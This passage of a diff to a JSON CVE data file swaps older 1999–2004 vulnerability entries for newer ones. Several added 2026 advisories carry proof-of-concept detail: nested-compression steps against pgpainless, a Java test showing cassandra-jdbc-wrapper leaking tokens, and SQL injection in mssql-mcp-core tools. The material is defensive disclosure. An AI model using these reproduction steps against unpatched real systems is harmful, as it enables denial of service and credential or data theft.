+        "http://jakarta.apache.org/builds/jakarta-tomcat/release/v3.3.1a/RELEASE-NOTES-3.3.1a.txt",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/12102"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-2036",
-      "summary": "SQL injection vulnerability in the art_print function in print.inc.php in unknown versions of jPortal before 2.3.1 allows remote attackers to inject arbitrary SQL commands via the id parameter.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-05-28",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=108577011129476&w=2",
-        "http://secunia.com/advisories/11737",
-        "http://securitytracker.com/id?1010327",
-        "http://www.osvdb.org/6503",
-        "http://www.securiteam.com/unixfocus/5HP020KD5K.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2038",
-      "summary": "Cross-site scripting (XSS) vulnerability in Land Down Under (LDU) before LDU 700 allows remote attackers to inject arbitrary web script or HTML via a BBcode img tag in (1) functions.php, (2) header.php or (3) auth.inc.php.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2004-05-29",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://ldu.neocrome.net/page.php?id=1357",
-        "http://marc.info/?l=bugtraq&m=108585789220174&w=2",
-        "http://secunia.com/advisories/11739",
-        "http://securitytracker.com/alerts/2004/May/1010335.html",
-        "http://www.osvdb.org/6508"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2039",
-      "summary": "e107 0.615 allows remote attackers to obtain sensitive information via a direct request to (1) alt_news.php, (2) backend_menu.php, (3) clock_menu.php, (4) counter_menu.php, (5) login_menu.php, and other files, which reveal the full path in a PHP error message.",
+      "id": "CVE-2004-0664",
+      "summary": "Directory traversal vulnerability in modules.php in PowerPortal 1.x allows remote attackers to list arbitrary directories via a .. (dot dot) in the files parameter.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2004-05-29",
+      "published": "2004-08-06",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=108588043007224&w=2",
-        "http://marc.info/?l=full-disclosure&m=108586723116427&w=2",
-        "http://secunia.com/advisories/11740",
-        "http://www.osvdb.org/6525",
-        "http://www.securityfocus.com/bid/10436"
+        "http://marc.info/?l=bugtraq&m=108844362627811&w=2",
+        "http://www.securityfocus.com/bid/10622",
+        "http://www.swp-zone.org/archivos/advisory-07.txt",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16530",
+        "http://marc.info/?l=bugtraq&m=108844362627811&w=2"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-2040",
-      "summary": "Multiple cross-site scripting (XSS) vulnerabilities in e107 0.615 allow remote attackers to inject arbitrary web script or HTML via the (1) LAN_407 parameter to clock_menu.php, (2) \"email article to a friend\" field, (3) \"submit news\" field, or (4) avmsg parameter to usersettings.php.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2004-05-29",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=108588043007224&w=2",
-        "http://marc.info/?l=full-disclosure&m=108586723116427&w=2",
-        "http://secunia.com/advisories/11740",
-        "http://www.osvdb.org/6526",
-        "http://www.osvdb.org/6527"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2041",
-      "summary": "PHP remote file inclusion vulnerability in secure_img_render.php in e107 0.615 allows remote attackers to execute arbitrary PHP code by modifying the p parameter to reference a URL on a remote web server that contains the code.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-05-29",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=108588043007224&w=2",
-        "http://marc.info/?l=full-disclosure&m=108586723116427&w=2",
-        "http://secunia.com/advisories/11740",
-        "http://www.osvdb.org/6530",
-        "http://www.securityfocus.com/bid/10436"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0291",
-      "summary": "Buffer overflow in Star Office 5.1 allows attackers to cause a denial of service by embedding a long URL within a document.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2000-04-16",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-04/0077.html",
-        "http://www.securityfocus.com/bid/1112",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-04/0077.html",
-        "http://www.securityfocus.com/bid/1112"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0264",
-      "summary": "Panda Security 3.0 with registry editing disabled allows users to edit the registry and gain privileges by directly executing a .reg file or using other methods.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2000-04-17",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://updates.pandasoftware.com/docs/us/Avoidvulnerability.zip",
-        "http://www.securityfocus.com/bid/1119",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=38FB45F2.550EA000%40teleline.es",
-        "http://updates.pandasoftware.com/docs/us/Avoidvulnerability.zip",
-        "http://www.securityfocus.com/bid/1119"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0265",
-      "summary": "Panda Security 3.0 allows users to uninstall the Panda software via its Add/Remove Programs applet.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2000-04-17",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://updates.pandasoftware.com/docs/us/Avoidvulnerability.zip",
-        "http://www.securityfocus.com/bid/1119",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=38FB45F2.550EA000%40teleline.es",
-        "http://updates.pandasoftware.com/docs/us/Avoidvulnerability.zip",
-        "http://www.securityfocus.com/bid/1119"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0083",
-      "summary": "HP asecure creates the Audio Security File audio.sec with insecure permissions, which allows local users to cause a denial of service or gain additional privileges.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2000-04-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/templates/advisory.html?id=2031",
-        "http://www.securityfocus.com/templates/advisory.html?id=2031"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0967",
-      "summary": "Buffer overflow in the HTML library used by Internet Explorer, Outlook Express, and Windows Explorer via the res: local resource protocol.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "1997-11-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0967",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0967"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1930",
-      "summary": "Buffer overflow in AN HTTPd 1.38 through 1.4.1c allows remote attackers to execute arbitrary code via a SOCKS4 request with a long username.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0032.html",
-        "http://www.iss.net/security_center/static/10410.php",
-        "http://www.securityfocus.com/bid/6012",
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0032.html",
-        "http://www.iss.net/security_center/static/10410.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1931",
-      "summary": "Cross-site scripting (XSS) vulnerability in PHP Arena paFileDB 1.1.3 and 2.1.1 allows remote attackers to inject arbitrary web script or HTML via Javascript in the search string.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://online.securityfocus.com/archive/1/296387",
-        "http://www.iss.net/security_center/static/10451.php",
-        "http://www.phparena.net/downloads/pafiledb.php?action=license&id=1&file=16",
-        "http://www.securityfocus.com/bid/6021",
-        "http://online.securityfocus.com/archive/1/296387"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1281",
-      "summary": "cgihtml 1.69 allows local users to overwrite arbitrary files via a symlink attack on certain temporary files.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.iss.net/security_center/static/11023.php",
-        "http://www.securityfocus.com/archive/1/305469",
-        "http://www.securityfocus.com/bid/6552",
-        "http://www.iss.net/security_center/static/11023.php",
-        "http://www.securityfocus.com/archive/1/305469"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1282",
-      "summary": "IBM Net.Data allows remote attackers to obtain sensitive information such as path names, server names and possibly user names and passwords by causing the (1) $(DTW_CURRENT_FILENAME), (2) $(DATABASE), (3) $(LOGIN), (4) $(PASSWORD), and possibly other predefined variables that can be echoed back to the user via a web form.",
+      "id": "CVE-2004-0665",
+      "summary": "csFAQ.cgi in csFAQ allows remote attackers to gain sensitive information via an invalid database parameter, which reveals the path to the web server in an error message.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2003-12-31",
+      "published": "2004-08-06",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.iss.net/security_center/static/11016.php",
-        "http://www.securiteam.com/securitynews/5CP061F8VS.html",
-        "http://www.securitytracker.com/id?1005890",
-        "http://www.iss.net/security_center/static/11016.php",
-        "http://www.securiteam.com/securitynews/5CP061F8VS.html"
+        "http://marc.info/?l=bugtraq&m=108844203121238&w=2",
+        "http://www.securityfocus.com/bid/10618",
+        "http://www.swp-zone.org/archivos/advisory-08.txt",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16526",
+        "http://marc.info/?l=bugtraq&m=108844203121238&w=2"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-1673",
-      "summary": "accountsettings_add.html in Merak Mail Server 7.4.5 with Icewarp Web Mail 5.2.7 and possibly other versions allow remote attackers to create text files with arbitrary content via the accountid parameter.",
+      "id": "CVE-2004-0666",
+      "summary": "Off-by-one error in the POP3_readmsg function in popclient 3.0b6 allows remote attackers to cause a denial of service (application crash) via an e-mail message with a certain line length, which leads to a buffer overflow.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2004-10-12",
+      "published": "2004-08-06",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=109483971420067&w=2",
-        "http://secunia.com/advisories/12789",
-        "http://www.securityfocus.com/bid/11371",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17317",
-        "http://marc.info/?l=bugtraq&m=109483971420067&w=2"
+        "http://lists.grok.org.uk/pipermail/full-disclosure/2004-June/023147.html",
+        "http://marc.info/?l=bugtraq&m=108852915403293&w=2",
+        "http://www.grok.org.uk/advisories/popclient.html",
+        "http://www.securityfocus.com/bid/10625",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16538"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-1360",
-      "summary": "Buffer overflow in the setupterm function of (1) lanadmin and (2) landiag programs of HP-UX 10.0 through 10.34 allows local users to execute arbitrary code via a long TERM environment variable.",
+      "id": "CVE-2004-0667",
+      "summary": "Rule Set Based Access Control (RSBAC) 1.2.2 through 1.2.3 allows access to sys_creat, sys_open, and sys_mknod inside jails, which could allow local users to gain elevated privileges.",
       "cvssScore": 7.2,
       "severity": "High",
+      "published": "2004-08-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=108861182906067&w=2",
+        "http://marc.info/?l=bugtraq&m=108879977120430&w=2",
+        "http://www.rsbac.org/download/bugfixes/",
+        "http://www.securityfocus.com/bid/10640",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16552"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0668",
+      "summary": "Web Access in Lotus Domino 6.5.1 allows remote attackers to cause a denial of service (server crash) via a large e-mail message, as demonstrated using a large image attachment.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-08-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=108871093704307&w=2",
+        "http://www.securityfocus.com/bid/10641",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16596",
+        "http://marc.info/?l=bugtraq&m=108871093704307&w=2",
+        "http://www.securityfocus.com/bid/10641"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1362",
+      "summary": "Win32k.sys in Windows NT 4.0 before SP2 allows local users to cause a denial of service (crash) by calling certain WIN32K functions with incorrect parameters.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "1999-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://support.microsoft.com/support/kb/articles/q160/6/01.asp",
+        "http://www.iss.net/security_center/static/7403.php",
+        "http://support.microsoft.com/support/kb/articles/q160/6/01.asp",
+        "http://www.iss.net/security_center/static/7403.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1350",
+      "summary": "Multiple buffer overflows in Sun Java System Web Proxy Server (formerly Sun ONE Proxy Server) 3.6 through 3.6 SP4 allow remote attackers to execute arbitrary code via unknown vectors, possibly CONNECT requests.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-10-30",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://secunia.com/advisories/13036/",
+        "http://securitytracker.com/id?1012005",
+        "http://sunsolve.sun.com/search/document.do?assetkey=1-26-57606-1&searchclause=security",
+        "http://www.auscert.org.au/render.html?it=4516",
+        "http://www.ciac.org/ciac/bulletins/p-027.shtml"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1121",
+      "summary": "Apple Safari 1.0 through 1.2.3 allows remote attackers to spoof the URL displayed in the status bar via TABLE tags.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-11-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://lists.apple.com/archives/security-announce/2004/Dec/msg00000.html",
+        "http://secunia.com/advisories/13047/",
+        "http://www.kb.cert.org/vuls/id/925430",
+        "http://www.securityfocus.com/bid/11573",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17909"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0883",
+      "summary": "The System Preferences capability in Mac OS X before 10.3 allows local users to access secure Preference Panes for a short period after an administrator has authenticated to the system.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2003-11-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://docs.info.apple.com/article.html?artnum=61798",
+        "http://lists.apple.com/mhonarc/security-announce/msg00038.html",
+        "http://docs.info.apple.com/article.html?artnum=61798",
+        "http://lists.apple.com/mhonarc/security-announce/msg00038.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1484",
+      "summary": "Microsoft Internet Explorer 6.0 SP1 allows remote attackers to cause a denial of service (crash) by creating a DHTML link that uses the AnchorClick \"A\" object with a blank href attribute.",
+      "cvssScore": 4.3,
+      "severity": "Medium",
       "published": "2003-12-31",
       "modified": null,
       "cwe": "CWE-119",
       "references": [
-        "http://securityreason.com/securityalert/3236",
-        "http://www.securityfocus.com/advisories/4957",
-        "http://www.securityfocus.com/archive/1/324381",
-        "http://www.securityfocus.com/bid/6834",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11314"
+        "http://securityreason.com/securityalert/3292",
+        "http://www.securityfocus.com/archive/1/320544",
+        "http://www.securityfocus.com/bid/7502",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11946",
+        "http://securityreason.com/securityalert/3292"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-1361",
-      "summary": "Unknown vulnerability in VERITAS Bare Metal Restore (BMR) of Tivoli Storage Manager (TSM) 3.1.0 through 3.2.1 allows remote attackers to gain root privileges on the BMR Main Server.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2003-02/0333.html",
-        "http://seer.support.veritas.com/docs/252933.htm",
-        "http://seer.support.veritas.com/docs/254442.htm",
-        "http://www.securityfocus.com/bid/6928",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11418"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1362",
-      "summary": "Bastille B.02.00.00 of HP-UX 11.00 and 11.11 does not properly configure the (1) NOVRFY and (2) NOEXPN options in the sendmail.cf file, which could allow remote attackers to verify the existence of system users and expand defined sendmail aliases.",
-      "cvssScore": 7.8,
-      "severity": "High",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": "CWE-16",
-      "references": [
-        "http://archives.neohapsis.com/archives/hp/2003-q1/0033.html",
-        "http://www.securityfocus.com/bid/6878",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11366",
-        "http://archives.neohapsis.com/archives/hp/2003-q1/0033.html",
-        "http://www.securityfocus.com/bid/6878"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1363",
-      "summary": "The remote web management interface of Aprelium Technologies Abyss Web Server 1.1.2 and earlier does not log connection attempts to the web management port (9999), which allows remote attackers to mount brute force attacks on the administration console without detection.",
-      "cvssScore": 6.4,
+      "id": "CVE-2003-1485",
+      "summary": "Clearswift MAILsweeper 4.0 through 4.3.7 allows remote attackers to bypass filtering via a file attachment that contains \"multiple extensions combined with large blocks of white space.\"",
+      "cvssScore": 5,
       "severity": "Medium",
       "published": "2003-12-31",
       "modified": null,
-      "cwe": null,
+      "cwe": "CWE-20",
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2003-02/0149.html",
-        "http://www.iss.net/security_center/static/11310.php",
-        "http://www.securityfocus.com/bid/6842",
-        "http://archives.neohapsis.com/archives/bugtraq/2003-02/0149.html",
-        "http://www.iss.net/security_center/static/11310.php"
+        "http://www.clearswift.com/download/bin/Patches/ReadMe_SMTP_438.htm",
+        "http://www.securityfocus.com/bid/7568",
+        "http://www.clearswift.com/download/bin/Patches/ReadMe_SMTP_438.htm",
+        "http://www.securityfocus.com/bid/7568"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0821",
-      "summary": "Microsoft Excel 97, 2000, and 2002 allows remote attackers to execute arbitrary code via a spreadsheet with a malicious XLM (Excel 4) macro that bypasses the macro security model.",
+      "id": "CVE-2003-1486",
+      "summary": "Phorum 3.4 through 3.4.2 allows remote attackers to obtain the full path of the web server via an incorrect HTTP request to (1) smileys.php, (2) quick_listrss.php, (3) purge.php, (4) news.php, (5) memberlist.php, (6) forum_listrss.php, (7) forum_list_rdf.php, (8) forum_list.php, or (9) move.php, which leaks the information in an error message.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": "CWE-200",
+      "references": [
+        "http://securityreason.com/securityalert/3288",
+        "http://www.securityfocus.com/archive/1/321310",
+        "http://www.securityfocus.com/bid/7571",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/12499",
+        "http://securityreason.com/securityalert/3288"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-76088",
+      "summary": "### Summary\nAn architectural security boundary bypass in inline-detach and MessageInspector allows remote, unauthenticated attackers to force unbounded recursive decompression routines. By supplying a specially crafted OpenPGP message containing deeply nested compressed packet structures, an attacker can completely bypass the library's built-in DoS protections (MAX_LAYER_DEPTH = 16), leading to resource exhaustion, thread blocking, and potential Out-of-Memory (OOM) application crashes.\n\n### Details\nThe pg-painless core processing pipeline implements a defensive threshold constraint to prevent decompression bomb sequences (Zip Bombs) and arbitrary resource consumption:\n\n    Enforcement Location: pgpainless-main/pgpainless-core/src/main/kotlin/org/pgpainless/decryption_verification/MessageMetadata.kt\n\n    Threshold Constant: MAX_LAYER_DEPTH = 16\n\nHowever, a code architecture review revealed two specific packet-walking implementations that unpack and step through PGPCompressedData packets manually, entirely failing to track or increment a layer depth index counter against the static compliance limits:\n\n    In InlineDetachImpl.kt (Line ~78-93): The logic loops over data packets via compressedData.dataStream. Because it processes the incoming data block-by-block without leveraging or passing constraints down to the guarded OpenPgpMessageInputStream tracking mechanism, it accepts infinite nesting.\n\n    In MessageInspector.kt (Line ~95): The inspector utility descends recursively down nested compressed packet layouts to ascertain inner content classification markers (e.g., determining encryption states) without referencing or respecting maximum layer depth boundaries.\n\n### PoC\nThe vulnerability can be verified by constructing an inline-signed binary message wrapped recursively inside multiple layers of compression packets:\n\n    Generate a standard, valid OpenPGP public/private keypair.\n\n    Sign a plaintext document sample utilizing binary inline-signing configurations (.noArmor()).\n\n    Programmatically loop 64 times over the output payload. In each iteration, encapsulate the previous binary output into a new PGPCompressedDataGenerator context configured with CompressionAlgorithmTags.ZIP.\n\n    Pass the final 64-layer nested byte array stream directly to the SOP interface via sop.inlineDetach().message(nestedBytes).toByteArrayAndResult().\n\nObserved Result: The library completely parses the highly nested structures, returning a successful outcome without raising any execution constraints. The code fails to throw the expected SOPGPException.BadData, proving that the 16-layer boundary constraint was completely bypassed during the streaming packet loop.\n\n### Impact\n\nWho is impacted: Any downstream application, gateway, or mail client (such as FlowCrypt or any framework integrating the library's SOP wrapper interface/MessageInspector modules) that handles untrusted, incoming external user files or signed attachment streams. An attacker can use this behavior to systematically freeze application threads, exhaust target heap allocation metrics, and disrupt backend infrastructure services.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2003-12-15",
+      "published": "2026-11-19",
+      "modified": "2026-11-19",
+      "cwe": {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      },
+      "references": [
+        "https://github.com/pgpainless/pgpainless/security/advisories/GHSA-cvx8-9ff6-54xq",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-76088",
+        "https://github.com/pgpainless/pgpainless/commit/7662f084595945f1000f3f2e1bc4e15302194dec",
+        "https://github.com/pgpainless/pgpainless/commit/94572773f62e313ae905c48314de44efcf82420e",
+        "https://github.com/pgpainless/pgpainless/releases/tag/1.7.8"
+      ],
+      "vulnerableProducts": [
+        "org.pgpainless:pgpainless-core maven"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-73504",
+      "summary": "### Summary\nThe fix for [AIKIDO-2024-10565](https://intel.aikido.dev/cve/AIKIDO-2024-10565) (plaintext password logging) introduced two\nredaction helpers — `DriverUtil.toStringWithoutSensitiveValues()` and\n`DriverUtil.redactSensitiveValuesInJdbcUrl()` — but both helpers only redact\nthe `\"password\"` property/parameter (`JdbcUrlUtil.TAG_PASSWORD`). The equally\nsensitive `\"token\"` property (`JdbcUrlUtil.TAG_TOKEN`), used for DataStax\nAstra and other token-based Cassandra authentication, is completely unredacted\nby both helpers. Applications using token-based authentication with DEBUG\nlogging enabled will therefore log the live authentication token in plaintext\nvia `SessionHolder`'s calls to these same two helpers — the exact same\nexposure pattern that the original fix was intended to prevent.\n\n### Details\n**File:** `src/main/java/com/ing/data/cassandra/jdbc/utils/DriverUtil.java`\n\n```java\n// toStringWithoutSensitiveValues (lines 341-347) -- only redacts \"password\"\npublic static String toStringWithoutSensitiveValues(final Properties properties) {\n    final Properties withRedactedSensitiveValues = (Properties) properties.clone();\n    if (withRedactedSensitiveValues.containsKey(TAG_PASSWORD)) {\n        withRedactedSensitiveValues.setProperty(TAG_PASSWORD, \"***\");\n    }\n    return withRedactedSensitiveValues.toString();\n}\n\n// redactSensitiveValuesInJdbcUrl (lines 355-378) -- only redacts \"password\"\nfinal String redactedQuery = Arrays.stream(...)\n    .map(param -> {\n        if (param.startsWith(TAG_PASSWORD + \"=\")) {\n            return TAG_PASSWORD + \"=***\";\n        }\n        return param;     // <-- \"token=...\" passes through unmodified\n    })\n    ...\n```\n\n`JdbcUrlUtil.java` defines `TAG_TOKEN = \"token\"` (line 407) as a separate,\ndistinct connection property used when connecting with DataStax Astra-style\ntoken-based authentication. Neither redaction helper checks for this key.\n\n**File:** `src/main/java/com/ing/data/cassandra/jdbc/SessionHolder.java`\n\nBoth helpers are called on connection-level properties at DEBUG log level:\n\n```java\n// Line 150 — logs all connection properties including \"token\" unredacted\nlog.debug(\"Final Properties to Connection: {}\",\n    toStringWithoutSensitiveValues(this.properties));\n\n// Lines 173, 190 — logs JDBC URL including \"?token=...\" unredacted\nfinal String jdbcUrl = redactSensitiveValuesInJdbcUrl(this.cacheKey.get(URL_KEY));\nlog.debug(\"Released last reference to {}, closing Session.\", jdbcUrl);\nlog.debug(\"Acquired reference to {}, new count = {}.\", jdbcUrl, ref + 1);\n```\n\nDEBUG logging is commonly enabled in production troubleshooting and staging\nenvironments, meaning the token is logged in plain text every time a\nconnection is acquired or released in such environments.\n\n### PoC\n**Environment:** JDK 17+, Maven 3.x\n\n**pom.xml dependency:**\n```xml\n<dependency>\n    <groupId>com.ing.data</groupId>\n    <artifactId>cassandra-jdbc-wrapper</artifactId>\n    <version>5.0.1</version>\n</dependency>\n```\n\n**Exploit.java:**\n```java\nimport com.ing.data.cassandra.jdbc.utils.DriverUtil;\nimport java.util.Properties;\n\npublic class Exploit {\n    public static void main(String[] args) throws Exception {\n        String secretToken = \"AstraCS:SUPER_SECRET_TOKEN_VALUE_1234567890\";\n\n        // Test 1: redactSensitiveValuesInJdbcUrl()\n        String urlWithToken = \"jdbc:cassandra://host:9042/ks?token=\" + secretToken;\n        String redacted = DriverUtil.redactSensitiveValuesInJdbcUrl(urlWithToken);\n        System.out.println(\"Token in 'redacted' URL: \" + redacted.contains(secretToken)); // true\n\n        // Test 2: toStringWithoutSensitiveValues()\n        Properties props = new Properties();\n        props.setProperty(\"token\", secretToken);\n        String redactedProps = DriverUtil.toStringWithoutSensitiveValues(props);\n        System.out.println(\"Token in 'redacted' props: \" + redactedProps.contains(secretToken)); // true\n\n        // Control: password IS correctly redacted\n        Properties propsWithPassword = new Properties();\n        propsWithPassword.setProperty(\"password\", \"secret\");\n        System.out.println(\"Password redacted: \" +\n            !DriverUtil.toStringWithoutSensitiveValues(propsWithPassword).contains(\"secret\")); // true\n    }\n}\n```\n\n**Result (confirmed, 3/3 reproductions on cassandra-jdbc-wrapper 5.0.1, the latest release):**\n\n```\nToken in 'redacted' URL:   true   <- token leaks through the URL redactor\nToken in 'redacted' props: true   <- token leaks through the property redactor\nPassword redacted:         true   <- password IS correctly masked (control)\n```\n\nThe \"redacted\" output for a token-based connection string is byte-for-byte\nidentical to the unredacted original — the helpers have no effect on `token`.\n\n### Impact\n**Vulnerability type:** Insertion of Sensitive Information into Log File (CWE-532).\n\nAn authentication token (functionally equivalent in sensitivity to a password\n— it grants full access to the Cassandra cluster) is written in plaintext to\napplication log files whenever:\n- The application uses token-based authentication (e.g., DataStax Astra), AND\n- DEBUG logging is enabled (common in staging environments and during\n  production troubleshooting sessions).\n\nAn attacker who can read log files — via log aggregation system access,\nmisconfigured log storage, or a separate log-reading vulnerability — can\nextract a live authentication token and use it to authenticate directly to\nthe Cassandra cluster, accessing all data the token is authorized to read or\nwrite.\n\nThis is exactly the same impact class as the original AIKIDO-2024-10565 fix\nwas intended to prevent — the fix simply missed a second sensitive credential\ntype that was already present in the codebase.",
+      "cvssScore": 5.5,
+      "severity": "Medium",
+      "published": "2026-11-19",
+      "modified": "2026-11-19",
+      "cwe": {
+        "cwe_id": "CWE-532",
+        "name": "Insertion of Sensitive Information into Log File"
+      },
+      "references": [
+        "https://github.com/ing-bank/cassandra-jdbc-wrapper/security/advisories/GHSA-jc42-994r-vvwp",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-73504",
+        "https://github.com/ing-bank/cassandra-jdbc-wrapper/commit/0b7ea0322e538304119f58f1214e4171312b245b",
+        "https://github.com/ing-bank/cassandra-jdbc-wrapper/commit/ace58f7cf5c981d8dfe302f1a514ae4c6f827f38",
+        "https://github.com/ing-bank/cassandra-jdbc-wrapper/releases/tag/v4.16.4"
+      ],
+      "vulnerableProducts": [
+        "com.ing.data:cassandra-jdbc-wrapper maven"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-63129",
+      "summary": "Several tools in `mssql-mcp-core` built T-SQL by string-interpolating caller-supplied identifiers and predicates directly into the statement passed to the node-mssql `Request.query()` batch API. Only data values were parameterized.\n\nAffected tools and inputs:\n- `update_data`, `delete_data`: `tableName` and the free-form `whereClause` were interpolated raw.\n- `insert_data`: `tableName` and column names (object keys) were interpolated raw.\n- `execute_transaction`: the same raw `tableName`/`whereClause` interpolation per operation.\n- `create_table`, `create_index`, `drop_table`: table/column/index/schema identifiers were interpolated with no or insufficient validation.\n- `list_databases` (reader tier): the `stateFilter` argument was interpolated raw into the query, with only a non-enforced inputSchema enum guarding it.\n\nThe only check on `whereClause` was that it was non-empty. Because the row-count and preview queries run before the `confirmUpdate`/`confirmDelete` step, a malicious `whereClause` or `tableName` executed on the first call, bypassing the preview/confirmation and `maxRows` safety controls. 